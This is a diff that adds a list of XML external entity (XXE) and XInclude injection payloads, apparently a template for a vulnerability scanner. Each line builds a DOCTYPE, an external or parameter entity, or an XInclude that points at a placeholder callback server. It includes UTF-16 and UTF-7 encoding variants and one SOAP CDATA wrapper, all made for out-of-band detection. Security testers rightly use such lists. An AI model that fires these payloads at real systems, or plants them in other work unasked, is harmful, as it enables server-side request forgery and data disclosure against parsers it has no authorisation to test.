@@ -1,0 +1,18 @@
+<?xml version="1.0"?><!DOCTYPE bla [<!ENTITY x "{{validate_str}}"> ]><y>&x;</y>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY % xxe SYSTEM "[CLOUD_SERVER_URL]" > %xxe; ]>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo[ <!ENTITY % pe SYSTEM "[CLOUD_SERVER_URL]">%pe; ]>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo SYSTEM "[CLOUD_SERVER_URL]" ><foo>&data;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo SYSTEM "[CLOUD_SERVER_URL]" >foo></foo>
+<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE data [<!ELEMENT r (#PCDATA)><!ENTITY file SYSTEM "[CLOUD_SERVER_URL]">]><r>&file;</r>
+<?xml version="1.0" encoding="UTF-7" ?><!DOCTYPE data [<!ELEMENT r (#PCDATA)><!ENTITY file SYSTEM "[CLOUD_SERVER_URL]">]><r>&file;</r>
+<?xml version="1.0"?><!DOCTYPE foo SYSTEM "[CLOUD_SERVER_URL]" ><foo>&data;</foo>
+<?xml version="1.0" ?><!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY sp SYSTEM "[CLOUD_SERVER_URL]"> ]><r>&sp;</r>
+<?xml version="1.0" ?><!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY % sp SYSTEM "[CLOUD_SERVER_URL]">%sp;]>
+<?xml version="1.0" ?><!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY % sp SYSTEM "[CLOUD_SERVER_URL]">%sp;]><r></r>
+<?xml version="1.0" encoding="utf-8"?><!ENTITY % dtd SYSTEM "[CLOUD_SERVER_URL]">%dtd;]>
+<!DOCTYPE r [ <!ENTITY % sp SYSTEM "[CLOUD_SERVER_URL]">%sp;]>
+<!DOCTYPE r [ <!ENTITY % sp SYSTEM "[CLOUD_SERVER_URL]">%sp;]><r></r>
+<!DOCTYPE test SYSTEM "[CLOUD_SERVER_URL]">
+<!ENTITY a SYSTEM "[CLOUD_SERVER_URL]" >
+<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "[CLOUD_SERVER_URL]"> %dtd;]><xxx/>]]></foo></soap:Body>
+<data xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="[CLOUD_SERVER_URL]"></xi:include></data>
